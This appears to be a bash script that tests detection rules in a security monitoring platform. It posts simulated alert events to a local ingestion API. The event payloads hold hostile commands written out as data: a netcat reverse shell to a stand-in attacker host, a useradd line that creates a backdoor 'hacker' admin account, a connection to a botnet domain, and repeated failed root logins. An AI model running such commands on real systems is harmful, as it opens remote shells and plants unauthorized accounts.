#!/bin/bash

# SentinelX Security Event Injector - Local Threat Simulator
# Fired direct REST payloads into ingestion API to simulate EDR threat alerts.

API_URL="http://localhost:8080/api/v1/events"
HOST_ID="simulation-host"
HOSTNAME="target-sec-server"

echo "=========================================================="
echo "🛡️  SentinelX SOC Platform - Local Threat Simulator 🛡️"
echo "=========================================================="
echo "Target API: $API_URL"
echo "Injecting security events..."

# 1. Reverse Shell Event (CRITICAL Alert)
echo -e "\n🔥 [1/4] Injecting Behavioral Reverse Shell command..."
curl -s -X POST -H "Content-Type: application/json" -d "{
  \"host_id\": \"$HOST_ID\",
  \"hostname\": \"$HOSTNAME\",
  \"os\": \"linux\",
  \"timestamp\": \"$(date -u +"%Y-%m-%dT%H:%M:%SZ")\",
  \"process_events\": [
    {
      \"pid\": 8412,
      \"ppid\": 8400,
      \"command\": \"nc attacker-c2-channel.net 4444 -e /bin/bash\",
      \"executable\": \"nc\",
      \"user\": \"root\",
      \"timestamp\": \"$(date -u +"%Y-%m-%dT%H:%M:%SZ")\"
    }
  ]
}" $API_URL | grep -q "accepted" && echo "✅ Reverse shell process event ingested successfully!"

# 2. Suspicious Useradd Event (HIGH Alert)
echo -e "\n🔥 [2/4] Injecting Administrative Privilege Modification..."
curl -s -X POST -H "Content-Type: application/json" -d "{
  \"host_id\": \"$HOST_ID\",
  \"hostname\": \"$HOSTNAME\",
  \"os\": \"linux\",
  \"timestamp\": \"$(date -u +"%Y-%m-%dT%H:%M:%SZ")\",
  \"process_events\": [
    {
      \"pid\": 9520,
      \"ppid\": 9500,
      \"command\": \"useradd -m -g admin hacker -s /bin/bash\",
      \"executable\": \"useradd\",
      \"user\": \"root\",
      \"timestamp\": \"$(date -u +"%Y-%m-%dT%H:%M:%SZ")\"
    }
  ]
}" $API_URL | grep -q "accepted" && echo "✅ Useradd command event ingested successfully!"

# 3. Threat Intel Blocklist Trigger (CRITICAL Alert)
echo -e "\n🔥 [3/4] Injecting Socket Connection to Malicious Feodo Tracker C2 IP..."
curl -s -X POST -H "Content-Type: application/json" -d "{
  \"host_id\": \"$HOST_ID\",
  \"hostname\": \"$HOSTNAME\",
  \"os\": \"linux\",
  \"timestamp\": \"$(date -u +"%Y-%m-%dT%H:%M:%SZ")\",
  \"network_events\": [
    {
      \"source\": \"192.168.1.15\",
      \"destination\": \"evil-botnet.ru\",
      \"ip\": \"185.230.125.1\",
      \"port\": 80,
      \"protocol\": \"TCP\",
      \"process\": \"python3\",
      \"timestamp\": \"$(date -u +"%Y-%m-%dT%H:%M:%SZ")\"
    }
  ]
}" $API_URL | grep -q "accepted" && echo "✅ Network telemetry link ingested successfully!"

# 4. SSH Brute Force Injection (MEDIUM Alert)
echo -e "\n🔥 [4/4] Injecting sliding-window SSH login failures..."
ATTACKER_IP="45.80.201.12"
for i in {1..5}
do
  curl -s -X POST -H "Content-Type: application/json" -d "{
    \"host_id\": \"$HOST_ID\",
    \"hostname\": \"$HOSTNAME\",
    \"os\": \"linux\",
    \"timestamp\": \"$(date -u +"%Y-%m-%dT%H:%M:%SZ")\",
    \"login_events\": [
      {
        \"event\": \"failed_login\",
        \"user\": \"root\",
        \"source_ip\": \"$ATTACKER_IP\",
        \"timestamp\": \"$(date -u +"%Y-%m-%dT%H:%M:%SZ")\"
      }
    ]
  }" $API_URL > /dev/null
  echo "👉 Failed login ticket $i sent..."
  sleep 0.2
done
echo "✅ 5 Failed logins ingested! Redis has locked IP $ATTACKER_IP."

echo -e "\n=========================================================="
echo "🛡️  Simulation Completed! Check the SOC Dashboard alerts."
echo "=========================================================="
